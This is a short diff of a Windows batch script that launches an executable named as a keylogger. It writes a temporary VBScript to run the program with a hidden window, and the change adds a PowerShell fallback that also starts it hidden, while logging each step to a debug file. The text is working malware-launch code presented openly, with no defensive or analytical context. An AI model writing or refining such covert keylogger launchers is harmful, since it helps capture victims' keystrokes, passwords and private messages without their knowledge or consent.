@@ -5,10 +5,16 @@ echo KEYLOGGER_PATH: %KEYLOGGER_PATH% >> %TEMP%\debug.log
 if exist "%KEYLOGGER_PATH%" (
     echo Creating temporary VBScript to run EXE hidden... >> %TEMP%\debug.log
     echo Set WShell = CreateObject("WScript.Shell") > %TEMP%\run_hidden.vbs
-    echo WShell.Run Chr(34) & "%KEYLOGGER_PATH%" & Chr(34), 0, False >> %TEMP%\run_hidden.vbs
-    wscript %TEMP%\run_hidden.vbs
-    echo Hidden run command executed. >> %TEMP%\debug.log
-    del %TEMP%\run_hidden.vbs
+    echo WShell.Run Chr(34) ^& "%KEYLOGGER_PATH%" ^& Chr(34), 0, False >> %TEMP%\run_hidden.vbs
+    wscript //B %TEMP%\run_hidden.vbs
+    if errorlevel 1 (
+        echo VBScript failed, trying PowerShell... >> %TEMP%\debug.log
+        powershell -Command "Start-Process -FilePath '%KEYLOGGER_PATH%' -WindowStyle Hidden"
+        echo PowerShell run command executed. >> %TEMP%\debug.log
+    ) else (
+        echo VBScript run command executed. >> %TEMP%\debug.log
+    )
+    del %TEMP%\run_hidden.vbs 2>nul
 ) else (
     echo Error: Keylogger file not found! >> %TEMP%\debug.log
 )
